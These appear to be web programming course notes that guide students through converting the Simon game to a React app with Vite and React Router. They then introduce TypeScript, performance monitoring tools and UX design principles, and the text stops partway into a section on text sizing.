Here is a complete list of all the steps involved to convert Simon to a React application. When you port your startup to React you will want to commit your changes as you complete each step in the process.
Clone the simon-websocket repository
Reorganize the code
Install and configure Vite
Convert to React Bootstrap
Enable React
Create app component
Create view components
Create the router
Convert scores component
Convert other components
To give you a picture of where we will end up after porting to React, the final Simon project structure looks like the following.
├─ vite.config.js              # Config for Vite dev debugging
├─ deployReact.sh              # React specific deployment
├─ index.html                  # Single HTML file for the App
├─ index.jsx                   # Loads the top level component
├─ package.json                # Defines dependent modules
├─ public                      # Static assets used in the app
│   ├─ button-bottom-left.mp3
│   ├─ button-bottom-right.mp3
│   ├─ button-top-left.mp3
│   ├─ button-top-right.mp3
│   ├─ error.mp3
│   └─ favicon.ico
├─ service                     # Backend service code
│   ├─ database.js
│   ├─ dbConfig.json
│   ├─ index.js
│   ├─ package-lock.json
│   ├─ package.json
│   └─ peerProxy.js
└─ src                         # Frontend React code
    ├─ app.jsx                 # Top level component
    ├─ app.css
    ├─ about                   # About component
    │   ├─ about.css
    │   └─ about.jsx
    ├─ login                   # Login component
    │   ├─ login.jsx           # Renders auth sub-components
    │   ├─ authState.js        # Enum for auth state
    │   ├─ unauthenticated.jsx # Renders if unauthenticated
    │   ├─ authenticated.jsx   # Renders if authenticated
    │   ├─ authenticated.css
    │   └─ messageDialog.jsx
    ├─ play                    # Game play component
    │   ├─ delay.js
    │   ├─ gameNotifier.js
    │   ├─ play.jsx
    │   ├─ players.css
    │   ├─ players.jsx
    │   ├─ simonButton.jsx
    │   ├─ simonGame.css
    │   └─ simonGame.jsx
    └─ scores                 # Scores component
        ├─ scores.css
        └─ scores.jsx

Reorganize the code
Because we are hosting both the Simon React application and the Simon service web service in the same project, we need to put them each in separate directories. We want the service code in a service directory and the React code in the src directory. To accomplish this, first delete the node_modules directory from the simon directory. Then move the service code (package.json, package-lock.json, index.js, database.js, peerProxy.js, and dbConfig.json) into a subdirectory named service. Then run npm install in the service directory in order to get the NPM packages for the service.
Once you move the service to the service directory, you can test that the service is still working by running node index.js from a console window in the service directory, or by pressing F5 in VS Code. Try it out and make sure you can hit the service endpoints using curl.
➜  curl 'localhost:3000/api/user/joe'

{"msg":"Unknown"}

Next, we want to move the existing UI code to a location where Vite expects to find it. To do this we move all of the files out of public into the project root directory. This will allow us to run our existing code under Vite to make sure everything is working. Once we start porting over to React, we will convert each of these files to React components located in a directory called src. From the root project directory run:
mv public/* .
rm -r public

Install and configure Vite
While in your project root directory, install Vite as a development dependency by running:
npm init -y
npm install vite@latest -D

Then insert/replace the scripts found in the newly created package.json file located in your project root directory to include the commands for running Vite.
 "scripts": {
    "dev": "vite",
    "build": "vite build",
    "preview": "vite preview"
  }

Configuring Vite for debugging
When running in production, the Simon web service running under Node.js on port 3000 serves up the Simon React application code when the browser requests index.html. This is the same as we did with previous Simon deliverables. The service pulls those files from the application's static HTML, CSS, and JavaScript files located in the public directory that we set up when we build the production distribution package.

However, when the application is running in debug mode in your development environment, we actually need two HTTP servers running: one for the Node.js backend HTTP server, and one for the Vite frontend HTTP server. This allows us to develop and debug both our backend and our frontend while viewing the results in the browser.
By default, Vite uses port 5173 when running in development mode. Vite starts up the debugging HTTP server when we run npm run dev. That means the browser is going to send network requests to port 5173. We can configure the Vite HTTP server to proxy service HTTP and WebSocket requests to the Node.js HTTP server by providing a configuration file named vite.config.js with the following contents.
import { defineConfig } from 'vite';

export default defineConfig({
  server: {
    proxy: {
      '/api': 'http://localhost:3000',
      '/ws': {
        target: 'ws://localhost:3000',
        ws: true,
      },
    },
  },
});

When running in this configuration, the network requests now flow as shown below. Without this you will not be able to debug your React application in your development environment.

With our server running, and our files in the place where Vite expects them, we can test that everything still works. You can start Vite in dev mode with the command npm run dev, followed by pressing the o key to open the application in the browser. When you reach this point with your startup, make sure that you commit your changes.
Convert to React Bootstrap
There is an NPM package called React Bootstrap that wraps the Bootstrap CSS framework in React components. This allows you to treat the Bootstrap widgets, such as Button and Modal, as a React component instead of just imported CSS and JavaScript.
To use the React version of Bootstrap, import the NPM package.
npm install bootstrap react-bootstrap

Now, in the components where you want to refer to the Bootstrap styles, you can import the Bootstrap style sheet from the imported NPM package just like you would other CSS files.
import 'bootstrap/dist/css/bootstrap.min.css';

To use a React Bootstrap component, you would import and reference the specific component you want to use. Here is an example of using the Button component.
import Button from 'react-bootstrap/Button';

export function NavButton({ text, url }) {
  const navigate = useNavigate();
  return (
    <Button variant='primary' onClick={() => navigate({ url })}>
      {text}
    </Button>
  );
}

For Simon we converted the modal dialog and button implementations to use the React Bootstrap components.
Enabling React
We now have everything set up to start using React for the application. To make this happen, we need to install the React components for the basic functionality, DOM manipulation, and request routing to display individual components. React is installed by running the following console command:
npm install react react-dom react-router-dom

index.html and index.jsx
With React we have a single HTML file that dynamically loads all of the other application components into its DOM using JavaScript. We replace the existing index.html file with the following React version.
index.html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <link rel="icon" href="/favicon.ico" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="theme-color" content="#000000" />

    <title>Simon React</title>
  </head>
  <body>
    <noscript>You need to enable JavaScript to run this app.</noscript>
    <div id="root"></div>
    <script type="module" src="/index.jsx"></script>
  </body>
</html>

Notice that the div with an ID of root is where all the content will be injected. The script reference for index.jsx causes the injection of the top level component named App. To hook the index.html to our top level App component, we create the following index.jsx file.
index.jsx
import React from 'react';
import ReactDOM from 'react-dom/client';
import App from './src/app';

const root = ReactDOM.createRoot(document.getElementById('root'));
root.render(<App />);

Create App component
To begin the transformation to using React components in our application, we create a top-level component, stored in src/app.jsx, and add some placeholder content that will get replaced later. In order for the styling to show up, we include Bootstrap, move the main.css content into a file named src/app.css, and import the CSS file into the app.jsx file. Because we don't have a body element in our App component, we modify the app.css so that the selector for the body element is changed to a class selector .body.
app.jsx
import React from 'react';
import 'bootstrap/dist/css/bootstrap.min.css';
import './app.css';

export default function App() {
  return <div className='body bg-dark text-light'>App will display here</div>;
}

You should be able to view the results of these changes by running npm run dev from the console and pressing the o key to open it in the browser. The result won't be very exciting, but this successfully demonstrates the first visible step towards moving to React. When you reach this point with your startup, make sure that you commit your changes.

To make app.jsx represent the actual Simon content, we enhance the app.jsx file to contain the header and footer HTML found in each of our previous HTML files, into the return value for the App() component function. Next, we rename the class attribute to be className so that it doesn't conflict with the JavaScript class keyword. The className keyword will get transpiled to valid HTML by our toolchain. When completed, the App component should look like this:
app.jsx
export default function App() {
  return (
    <div className='body bg-dark text-light'>
      <header className='container-fluid'>
        <nav className='navbar fixed-top navbar-dark'>
          <div className='navbar-brand'>
            Simon<sup>&reg;</sup>
          </div>
          <menu className='navbar-nav'>
            <li className='nav-item'>
              <a className='nav-link' href='index.html'>
                Home
              </a>
            </li>
            <li className='nav-item'>
              <a className='nav-link' href='play.html'>
                Play
              </a>
            </li>
            <li className='nav-item'>
              <a className='nav-link' href='scores.html'>
                Scores
              </a>
            </li>
            <li className='nav-item'>
              <a className='nav-link' href='about.html'>
                About
              </a>
            </li>
          </menu>
        </nav>
      </header>

      <main>App components go here</main>

      <footer className='bg-dark text-white-50'>
        <div className='container-fluid'>
          <span className='text-reset'>Author Name(s)</span>
          <a className='text-reset' href='https://github.com/webprogramming260/simon-react'>
            Source
          </a>
        </div>
      </footer>
    </div>
  );
}

This will display the header, navigation elements, placeholder content, and the footer. When you reach this point with your startup, make sure that you commit your changes.

Create view components
We now create React component files login.jsx, play.jsx, scores.jsx, and about.jsx to represent each of the application views. To begin with, these are just stubs that we will populate as we move functionality from the old js files into the jsx components. We place each of the stubbed components in a separate directory (e.g. src/login/login.jsx) so that we can keep all of the component files together.
Here is the login.jsx stub before any code is converted over. The other components are similar.
import React from 'react';

export function Login() {
  return (
    <main className='container-fluid bg-secondary text-center'>
      <div>login displayed here</div>
    </main>
  );
}

Create the router
With app.jsx containing the header and footer, and all the application view component stubs created, we can now create the router that will display each component as the navigation UI requests it. The router controls the whole application by determining what component to display based upon what navigation the user chooses. To implement the router, we import the router component into the App component, and wrap all of the App component's elements with the BrowserRouter component. We also import all of our view components.
import { BrowserRouter, NavLink, Route, Routes } from 'react-router-dom';
import { Login } from './login/login';
import { Play } from './play/play';
import { Scores } from './scores/scores';
import { About } from './about/about';

const root = ReactDOM.createRoot(document.getElementById('root'));
root.render(
  <BrowserRouter>
    <div className='body bg-dark text-light'><!-- sub-elements here --></div>
  </BrowserRouter>
);

Navigating routes
We then we replace the a elements with the router's NavLink component. The anchor element's href attribute is replaced with the router's to attribute. The NavLink component prevents the browser's default navigation functionality and instead handles it by replacing the currently displayed component.
<a className="nav-link" href="play.html">Play</a>

// to

<NavLink className='nav-link' to='play'>Play</NavLink>

The nav element's code now looks like the following.
<nav className='navbar fixed-top navbar-dark'>
  <div className='navbar-brand'>
    Simon<sup>&reg;</sup>
  </div>
  <menu className='navbar-nav'>
    <li className='nav-item'>
      <NavLink className='nav-link' to=''>
        Login
      </NavLink>
    </li>
    <li className='nav-item'>
      <NavLink className='nav-link' to='play'>
        Play
      </NavLink>
    </li>
    <li className='nav-item'>
      <NavLink className='nav-link' to='scores'>
        Scores
      </NavLink>
    </li>
    <li className='nav-item'>
      <NavLink className='nav-link' to='about'>
        About
      </NavLink>
    </li>
  </menu>
</nav>

Injecting the routed component
The router definitions are then inserted so that the router knows what component to display for a given path. The router changes the rendered component; it appears in the place of the Routes element. The Routes element replaces the main element in the component HTML.
<main>App components go here</main>

 // to

<Routes>
  <Route path='/' element={<Login />} exact />
  <Route path='/play' element={<Play />} />
  <Route path='/scores' element={<Scores />} />
  <Route path='/about' element={<About />} />
  <Route path='*' element={<NotFound />} />
</Routes>

Notice that the * (default matcher) was added to handle the case where an unknown path is requested. We handle this by creating a component for a path that is not found. We place this component at the bottom of our src/app.jsx file.
function NotFound() {
  return <main className='container-fluid bg-secondary text-center'>404: Return to sender. Address unknown.</main>;
}

At this point the application should support navigating to the different components. When you reach this point with your startup, make sure that you commit your changes.

Converting to React components
The code for each of the HTML pages needs to now be converted to the different React components. Each of the components is a bit different, and so you want to review them to determine what they look like as a React component.
The basic steps for converting the component include the following.
Copy the main element HTML over and put it in the return value of the component. Don't copy the header and footer HTML since they are now represented in app.jsx.
Rename the class to className so that it doesn't conflict with the JavaScript keyword class.
Copy the JavaScript over and turn the functions into inner functions of the React component.
Move the CSS over to the component directory and use an import statement to bring it into the component's jsx file.
Create React state variables for each of the stateful objects in the component.
Replace DOM query selectors with React state variables.
Move state up to parent components as necessary. For example, authentication state, or user name state.
Create child components as necessary. For example, a SimonGame and SimonButton component.
In order for you to have a feel for how this is done we will demonstrate how this is done with the Scores component.
Convert Scores component
The first step to implementing the Scores component is to create a state variable that will represent the scores that we read from the server. We will update the scores as a side effect when our fetch request to get the scores asynchronously completes. This is done with the following code:
const [scores, setScores] = React.useState([]);

React.useEffect(() => {
  fetch('/api/scores')
    .then((response) => response.json())
    .then((scores) => {
      setScores(scores);
      localStorage.setItem('scores', JSON.stringify(scores));
    })
    .catch(() => {
      const scoresText = localStorage.getItem('scores');
      if (scoresText) {
        setScores(JSON.parse(scoresText));
      }
    });
}, []);

When we get the scores back from the backend server, we want to convert them to JSX. This is done by iterating through the scores and pushing them into a variable named scoreRows that represents an array of JSX elements for each high score.
const scoreRows = [];
if (scores.length) {
  for (const [i, score] of scores.entries()) {
    scoreRows.push(
      <tr key={i}>
        <td>{i}</td>
        <td>{score.name.split('@')[0]}</td>
        <td>{score.score}</td>
        <td>{score.date}</td>
      </tr>
    );
  }
} else {
  scoreRows.push(
    <tr key='0'>
      <td colSpan='4'>Be the first to score</td>
    </tr>
  );
}

Now we can bring over the main element from the existing scores.html file to the src/scores/scores.jsx file and place it as the return value from the component function. Next, we insert a reference to the scoreRows variable that will display the score JSX. That should look like the following:
return (
  <main className='container-fluid bg-secondary text-center'>
    <table className='table table-warning table-striped-columns'>
      <thead className='table-dark'>
        <tr>
          <th>#</th>
          <th>Name</th>
          <th>Score</th>
          <th>Date</th>
        </tr>
      </thead>
      <tbody id='scores'>{scoreRows}</tbody>
    </table>
  </main>
);

That completes the conversion of the HTML and JavaScript files that represent the scores functionality. You can safely delete the original scores.html and scores.js files.
Now we just need to move scores.css to src/scores/scores.css and import the CSS into the src/scores/scores.jsx.
import './scores.css';

With that all done, the scores should render nicely. You can follow a similar process to convert the other three application views to components.

Test as you go
That was a lot of changes and it is easy to make a mistake during the process. When you do this with your startup application, you will find it easier if you make a small change, and test that it still works. If it does, commit that change to Git. That way you can recover when things get broken before it gets out of hand.
Study this code
Get familiar with what the example code teaches.
Clone the repository to your development environment.
git clone https://github.com/webprogramming260/simon-react.git


Set up your Atlas credentials in a file named dbConfig.json that is in the same directory as database.js.
Add dbConfig.json to your .gitignore file so that it doesn't put your credentials into GitHub accidentally.
Review the code and get comfortable with everything it represents.
Debug the front and backend.
⚠ Do not use the live server extension since your frontend code will now be served up by the the Vite hot swappable HTTP server when you run npm run dev. Set breakpoints for your backend code inside of Visual Studio Code. Set breakpoints for your frontend code in the browser.
Make modifications to the code as desired. Experiment and see what happens.
Deploy to production
Deploy to your production environment using a copy of the deployReact.sh script found in the example class application. Take some time to understand how it works.
⚠ NOTE - The deployReact.sh deployment script is different from the previous scripts and depends upon the vite package to be installed so that it can execute the toolchain that bundles the React application into static files that the browser can render. The bundled files are then deployed to your production environment and served up using the Express static files middleware.
./deployReact.sh -k <yourpemkey> -h <yourdomain> -s simon
For example,
./deployReact.sh -k ~/keys/production.pem -h yourdomain.click -s simon


Update your startup repository notes.md with what you learned.
Make sure your project is visible from your production environment (e.g. https://simon.yourdomain.click).

Startup React
Now that you have experience with using a web framework, it is time to convert your application to use React. This will require significant modifications to your frontend code. Make sure you reserve enough time to successfully complete this work.
You must use the same startup GitHub repository that you created in the earlier instruction. Update the notes.md file with things that you learn as you work on your startup. As you make changes to your application, commit those changes and push them to GitHub. You will need at least ten commits to get full credit, but in reality you should have many more than that.
Remember to use the the browser's debugger window to debug your CSS and JavaScript. You can also debug your service JavaScript running on Node.js using the built in VS Code Node.js debugger.
Once you have developed your application to where you want it, you need to release it to your production environment. Replace your previous startup deployment script with a copy of the deployReact.sh script from the Simon React repository and use startup for the service parameter (-s).
./deployReact.sh -k <yourpemkey> -h <yourdomain> -s startup

For example,
./deployReact.sh -k ~/keys/production.pem -h yourdomain.click -s startup

Doing this will make this deliverable of your startup available from https://startup.yourdomainname.
☑ Assignment
Review and deploy Simon React
Clone the Simon React repository to your development environment.
Run npm install in both the root of the project and the services directory.
Open the project in VS Code and examine the application's use of React.
Create and configure the service/dbConfig.json file with your MongoDB credentials.
Execute your backend code in your development environment by debugging the application using VS Code's Node.js debugger (press F5 while viewing service/index.js). Set breakpoints in VS Code and step through the backend JavaScript related to login interactions.
Execute your frontend code in your development environment by running npm start from the console in the root of the project. This will automatically open your browser to https://localhost:3001. Use the browser's dev tools to step through the frontend JavaScript using the Source tab.
Deploy to your production environment using the deployment script so that it is available with your domain's simon subdomain.
Convert your startup frontend to use React. This includes:
Creating a template starting application using vite and cleaning up what it created.
Creating a react router that displays stubbed components for the main pieces of your application.
Converting your previous HTML files into the stubbed components.
Make sure your name is displayed in the application and that there is a link to your GitHub repository.
Periodically commit and push your code to GitHub.
Periodically update your startup repository's notes.md file to reflect what you have learned and want to remember.
Push your final version of your project to GitHub.
Deploy your startup application to your production environment (your server).
Make sure your application is available from your production environment.
Upload the URL to your startup application to the Canvas assignment.
Grading Rubric
Prerequisite: Simon React deployed to your production environment
Prerequisite: A link to your GitHub startup repository prominently displayed on your application's home page
Prerequisite: Notes in your startup Git repository README.md file documenting what you modified and added with this deliverable. The TAs will only grade things that have been clearly described as being completed. Review the voter app as an example.
Prerequisite: At least 10 git commits spread consistently throughout the assignment period.
Application converted to use React
10% Bundled using Vite
30% Multiple functional react components
30% React router
30% React hooks
Go celebrate
With the completion of your application you have become a Startup Founder. Way to go! Time to grab some friends, recruit them to market your soon-to-be-viral application, and celebrate by going out to lunch. I'm thinking tacos. 🌮

TypeScript
📖 Deeper dive reading: Typescript in 5 minutes
TypeScript adds static type checking to JavaScript. This provides type checking while you are writing the code to prevent mistakes like using a string when a number is expected. Consider the following simplistic JavaScript code example.
function increment(value) {
  return value + 1;
}

let count = 'one';
console.log(increment(count));

When this code executes the console will log one1 because the count variable was accidentally initialized with a string instead of a number.
With TypeScript you explicitly define the types, and as the JavaScript is transpiled (with something like Babel) an error will be generate long before the code is seen by a user. To provide type safety for our increment function, it would look like this:
function increment(value: number) {
  return value + 1;
}

let count: number = 'one';
console.log(increment(count));

With TypeScript enabled, VS Code will analyze the code and give you an error about the invalid type conversion.

In addition to defining types for function parameters, you can define the types of object properties. For example, when defining the state for a React class style component, you can specify the types of all the state and property values.
export class About extends React.Component {
  state: {
    imageUrl: string;
    quote: string;
    price: number;
  };

  constructor(props: { price: number }) {
    super(props);

    this.state = {
      imageUrl: '',
      quote: 'loading...',
      price: props.price,
    };
  }
}

You can likewise specify the type of a React function style component's properties with an inline object definition.
function Clicker(props: { initialCount: number }) {
  const [count, updateCount] = React.useState(props.initialCount);

  return <div onClick={() => updateCount(1 + count)}>Click count: {count}</div>;
}

Interfaces
Because it is so common to define object property types, TypeScript introduced the use of the interface keyword to define a collection of parameters and types that an object must contain in order to satisfy the interface type. For example, a Book interface might look like the following.
interface Book {
  title: string;
  id: number;
}

You can then create an object and pass it to a function that requires the interface.
function catalog(book: Book) {
  console.log(`Cataloging ${book.title} with ID ${book.id}`);
}

const myBook = { title: 'Essentials', id: 2938 };
catalog(myBook);

Beyond type checking
TypeScript also provides other benefits, such as warning you of potential uses of an uninitialized variable. Here is an example of when a function may return null, but the code fails to check for this case.

You can correct this problem with a simple if block.
const containerEl = document.querySelector<HTMLElement>('#picture');
if (containerEl) {
  const width = containerEl.offsetWidth;
}

Notice that in the above example, the return type is coerced for the querySelector call. This is required because the assumed return type for that function is the base class Element, but we know that our query will return the subclass HTMLElement and so we need to cast that to the subclass with the querySelector<HTMLElement>() syntax.
Unions
TypeScript introduces the ability to define the possible values for a new type. This is useful for doing things like defining an enumerable.
With plain JavaScript you might create an enumerable with a class.
export class AuthState {
  static Unknown = new AuthState('unknown');
  static Authenticated = new AuthState('authenticated');
  static Unauthenticated = new AuthState('unauthenticated');

  constructor(name) {
    this.name = name;
  }
}

With TypeScript you can define this by declaring a new type and defining what its possible values are.
type AuthState = 'unknown' | 'authenticated' | 'unauthenticated';

let auth: AuthState = 'authenticated';

You can also use unions to specify all of the possible types that a variable can represent.
function square(n: number | string) {
  if (typeof n === 'string') {
    console.log(`{$n}^2`);
  } else {
    console.log(n * n);
  }
}

Using TypeScript
If you would like to experiment with TypeScript you can use CodePen, or the official TypeScript playground. The TypeScript playground has the advantage of showing you inline errors and what the resulting JavaScript will be.

To use TypeScript in your web application you can create your project using vite. Vite knows how to use typescript without any additional configuration.
npm create vite@latest
✔ Project name: … viteDemo
✔ Select a framework: › React
? Select a variant: › - Use arrow-keys. Return to submit.
❯   TypeScript
    TypeScript + SWC
    JavaScript
    JavaScript + SWC
    Remix ↗

If you want to convert an existing application, then install the NPM typescript package to your development dependencies.
npm install --save-dev typescript

This will only include typescript package when you are developing and will not distribute it with a production bundle.
Once you have TypeScript installed for your project, you then configure how you want TypeScript to interact with your code by creating a tsconfig.json file.
If your project structure is configured to have your source code in a directory named src, and you want to output to a directory named build then you would use the following TS configuration file.
{
  "compilerOptions": {
    "rootDir": "src",
    "outDir": "build",
    "target": "es5",
    "lib": [
      "dom",
      "dom.iterable",
      "esnext"
    ],
    "allowJs": true,
    "skipLibCheck": true,
    "esModuleInterop": true,
    "allowSyntheticDefaultImports": true,
    "strict": true,
    "forceConsistentCasingInFileNames": true,
    "noFallthroughCasesInSwitch": true,
    "module": "esnext",
    "moduleResolution": "node",
    "resolveJsonModule": true,
    "isolatedModules": true,
    "noEmit": true,
    "jsx": "react-jsx"
  },
  "include": [
    "./src/**/*"
  ]
}

To learn what all of the tsconfig.json options do, refer to What is a tsconfig.json.

Performance monitoring
The performance of your application plays a huge role in determining user satisfaction. The following statistics show the impact that just one second of delay can make.

Source: WPEngine
In order to prevent losing users, you want your application to load in about one second. That means you need consistently measure and improve the responsiveness of your application. The main things you want to monitor include:
Browser application latency
Network latency
Service endpoint latency
For the context of this discussion, latency is defined as the delay that your user experiences before a request is satisfied.
Let's look at each of these performance areas, and then we can suggest some tools for measuring and improving the results.
Browser application latency
Browser application latency is impacted by the speed of the user's device, the amount of data that needs to be processed, and the time complexity of the processing algorithm.
When a user requests your application in a browser, the browser will request your index.html page first. This is followed by requests for any files that index.html links, such as JavaScript, CSS, video, and image files. Once your JavaScript is loaded, it will start making requests to services. This includes any endpoints that your provide as well as ones provided by third parties. Each of those requests takes time for the browser to load and render. A page with lots of large images and lots of service calls, will take longer than a page that only loads simple text from a single HTML file.
Likewise, if your JavaScript does significant processing while a page is loading, then your user will notice the resulting latency. You want to make application processing as asynchronous as possible so that it is done in the background without impacting the user experience.
You can reduces the impact of file size, and HTTP requests in general, by doing one or more of the following:
Use compression when transferring files over HTTP.
Reduce the quality of images and video to the lowest acceptable level.
Minify JavaScript and CSS. This removes all whitespace and creates smaller variable names.
Use HTTP/2 or HTTP/3 so that your HTTP headers are compressed and the communication protocol is more efficient.
You can also reduce the number of requests you make by combining the responses from multiple endpoint requests into a single request. This eliminates duplicated fields, but also decreases the overhead associated with each request.
Network latency
You pay a latency price for every network request that you make. For this reason, you want to avoid making unnecessary or large requests.
Network latency is impacted by the amount of data that you send, the amount of data a user can receive per second (this is called bandwidth), and the distance the data has to travel.
If the user has a low bandwidth connection that can only receive data at rates lower than 1 megabit per second, then you need to be very careful to reduce the number of bytes that you send to that user. Global latency is also a problem for users. If your application is hosted in a data center located in San Francisco, and used by someone living in Nairobi, then there will be a additional latency of 100 to 400 milliseconds for each request.
You can mitigate the impact of global latency by hosting your application files in data centers that are close to the users you are trying to serve. Applications that are seeking to reach a global audience will often host their application from dozens of places around the world.
Service endpoint latency
Service endpoint latency is impacted by the number of request that are made and the amount of time that it takes to process each request.
When a web application makes a request to a service endpoint there is usually some functionality in the application that is blocked until the endpoint returns. For example, if a user requests the scores for a game, the application will delay rendering until those scores are returned.
You want to reduce the latency of your endpoints as much as possible. Ideally you want to keep the endpoint latency to less than 10 milliseconds (ms). This may seem like a very short time, but commonly, an application will make dozens of endpoint requests to render a component. If each of those endpoints take 10 ms, then you are looking at 100 to 200 ms. When you add network latency to the time it takes for the application to process the response, and then add the time it takes for the browser to render, you can easily exceed the desired 1 second load time.
Performance tools
📖 Deeper dive reading: Chrome performance tools
Chrome network tab
You can see the network requests made by your application and the time necessary for each request, by using the browser's debugging tools. This will show you what files and endpoints are requested and how long they are taking. If you sort by time or size, it will be clearer what areas need your attention. Make sure you clear your cache before running tests so that you can see what the real latency is and not just the time it takes to load from the browser's cache.

Simulating real users
The network tools in the Chrome debugger also allows you to simulate low bandwidth connections by throttling your network. For example, you can simulate a 3G network connection that you would find on a low end mobile phone.

Throttling while testing is really useful since web developers often have high end computers and significant network bandwidth. That means you are not having the same experience as your users, and you will be surprised when they don't use your application because it is so slow.
Chrome Lighthouse
You can also use the Chrome debugging Lighthouse tool to run an analysis of your application. This will give you an average performance rating based upon the initial load time, longest content paint, and time before the user can interact with the page.

Chrome performance tab
When you are ready to dig into your application's frontend performance make sure you experiment with the Chrome debugger's performance tab. This breaks down the details of your application based upon discrete intervals of time so that you can isolate where things are running slow.

You start profiling the performance by pressing the record button and then interacting with your application. Chrome will record memory usage, screenshots, and timing information. You can then press the stop recording button and review the collected data. For example, the performance data represented in the image above, shows that 56% of the execution time was used in the button.press function. If you drill in on the source code for the function you will see exactly which lines of the function were consuming the processing time.
Global speed tests
You also want to test your application from different locations around the world. There are many online providers that will run these test for you. Here are the results for running a test using Pingdom.com.

You can see that it is correctly suggesting that we enable gz compression on our transmitted data in order to increase performance, and to add headers that will enable caching on the browser.
This tool provided by DotComTools allows you to run tests from multiple locations at once.

Here you can see we perform acceptably from the United States and Europe, but are struggling in Asia. That makes sense considering that our server is located in North Virginia. In order to correct this, we need to use a Content Delivery Network (CDN) with an additional location closer to our target users in China.

UX design
Properly considering the user experience (UX) of your application will make all the difference in your success. Focusing first on technology, cost, or revenue tends to lead to an unsatisfying user experience. Instead you want to consider why someone is using your application, how they want to interact, how visually appealing it is, and how easy it is to get something done.
Design as a story
It is often useful to think of user experience as a story. Consider the background plot, the user entering the stage, interacting with other actors, and getting the audience to applaud. At first this may sound a bit strange, but applications are not used in a vacuum. There is always a reason someone is using your application. If you can clearly define that background plot, then the experience will better match the user's expectation. Likewise, if you know what results in a satisfied audience, then you build the application experience around delivering that result.
Consider the tourism application for the city of Philadelphia. They know a user visits the site because they want to have an experience in Philadelphia. The application immediately provides a time relevant proposal for that experience. All the navigation options for having a successful experience (events, food, deals, and trip planning) are immediately accessible. Just looking at the initial imagery conveys the excitement of engaging in the application.

Source: visitphilly
Simplicity
Google broke all the rules for web application design when they released their homepage in 1998.

Source: Google.com 2022
Previous to that, it was common for app designers to pile everything they could into the initial view of the application. This includes multiple advertisements, navigation options, lots of hyperlinks, and color choices. Here is an example from a competitor around the same time period.

Source: Lycos.com 1999
The key point of this example is that simplicity attracts users' attention and engages them in the application experience. Building off of Google's positive reaction, other major applications immediately followed their example. Here is the initial experience when visiting facebook's application for the first time. Notice that it simply states the purpose of the application and invites the user to create an account.

Source: facebook.com
Simplicity doesn't require a blank page. Simplicity can also be visually stimulating with beautiful imagery and simple navigation options.

Source: Nomadic Tribe
You can also include significant amounts of content. You just need to keep things focused on a single purpose, for example, creating an account, viewing images, or beginning your travel experience. Below is the Pinterest application landing page. Even though the viewport is cluttered with images, they are all working towards the same purpose of demonstrating the value of the application.

Consistency
There is a tension that exists with web applications between being consistent with how other applications work and being unique so that your experience stands out. What you want to avoid is being so different that a user has to think hard in order to use your application. This is usually avoided by using the standard conventions that a user expects to find on a web application. The following image describes the standard layout and navigation controls of an application.

What a standard layout is defined to be will migrate over time as new trends in application fashion seek to make things look fresh. However, if you follow current trends, your users are more likely to engage in your application.
One easy way to build an application that uses current design trends is to use a web framework that provides standard layouts, colors, and iconography. Here is an example of a template application built using a web framework with just a few minutes of work.

Navigation
A user should never get lost while using your application. To help orient your user you want to carefully design the flow of the application and provide the proper navigational controls.
Navigation Controls
Description
App controls
User settings, payment, and help controls
Device controls
Device specific controls such as back, next, and home
Breadcrumb
A path of the user's walk through the application
Common actions
Direct links to locations based on the current view

Application map
The first step in building your application should be to design an application map that has all the views that you will present to the user. This helps clarify the functional pieces of the application and their relationship to each other. For example, if you were building a music player you might start with a landing page that displays some marketing information and allows the user to create an account or log in. If the user is already logged in, then they start with a dashboard that shows recent or suggested songs. From there they can either search the music catalog, navigate to a collection of songs based on a playlist, album, or artist, or go to an individual song.

If your application map starts looking like a governmental bureaucracy then you probably want to reconsider the interrelation of functionality. A convoluted application map is a strong indicator that the user experience with be likewise convoluted.
Device controls
With a concise application map in place, you can design navigational controls that allow the user to successfully use the application. To begin with, you want to make sure the navigational controls provided by the device are completely supported. When your application is hosted in a browser the previous and next buttons should take the user through the stack of visited views. If your application is hosted on a mobile device then the conventions of that device should work properly. For example, on an Android device swiping left and right should navigate the application views backward or forwards.
Breadcrumb
You always want to indicate where the user is, where they came from, and where they can go. You can do this with a breadcrumb control that lists the path the user took to get to where they are.
Dashboard > Beatles > Abbey Road > Come Together
A breadcrumb quickly orients the user and also allows them to jump up the navigational path.
Common actions
You also want to anticipate where a user would commonly want to go based upon the view that they are in. For example, if they are playing a song by one artist, it is common that they will want to view related artists. Therefore you want to provide a navigational link that will take them to a search view with a prepopulated query for related artists.
Commonly accessed views should always be accessible from a standard location. For example, the user settings should always be on the top right, and the breadcrumb should always be on the top left. (Those locations get switched if using a Right-To-Left language.)
You want to partition a large application into functional areas and place links for each area in the navigation bar at the top of the application. For example, if we added the ability to create music to our music application, you would want links that switched between listening to and creating music.
Colors
One of the first things you should consider as you design your application is the color scheme that you will employ. This usually involves picking a a primary, secondary, and focus color.

Source: paletton.com
There are lots of tools out there that help you create a color scheme. These will let you chose monochromatic, adjacent, or triadic color schemes. You can then spin and adjust a color wheel until you get what you are looking for. With your scheme selected you can export the colors directly to CSS rulesets.
Some free tools you should explore include Paletton and Adobe.

Source: paletton.com
With your core colors selected, you can use different shades of the colors to reduce the starkness of the limited number of colors without turning your application into a rainbow.

Just make sure you stick with your color scheme and even consider it when selecting font colors and images.
Typography
A great font will make your application easy on your user's eyes and increase their attention span. Since fonts have been around since the Gutenberg Press, there is some serious history to them. The following shows the different attributes of a font.

Source: material.io
You can classify fonts into the following groups.
Font Class
Example
Meaning
Sans Serif

Only major strokes
Serif

Minor strokes off the major strokes
Monospace

All letters have the same size
Handwriting

Cursive strokes

Source: material.io
When picking fonts you usually want to restrict the number of fonts to three or less. You also want to use them consistently. For example, it is common to use a Sans Serif font for buttons, navigation links, and body text. Serif fonts are used for paragraph headings. Monospaced fonts are for coding examples or text that needs alignment.
If you are looking for royalty free fonts that you can use in your application, you should check out Google's open collection of fonts.

Iconography
Because users will recognize standard icons, you can decrease the learning curve for your application if you use standard web icons to identify common functionality. For example, most users will immediately identify the following three icons as the menu, sharing, and close actions.

Icons not only exploit user recognition, but they also save limited display space, and provide a visually pleasing alternative to text. The important thing is that you pick a set that includes standard icons and that you use them for their intended purpose. Icons become an anti-pattern when they are used to represent something that is contrary to their common usage.

Source: material.io
There are lots of standard icon packages that you can choose from. This includes packages such as Font Awesome, Bootstrap Icons, Material Icons, Flat Color Icons, and Ant Design Icons
Text
You want to be consistent in the size of the text that you use as well as the number of characters displayed on a line. Commonly there are five different catagories of text sizes used by an application. These include the following.
Purpose
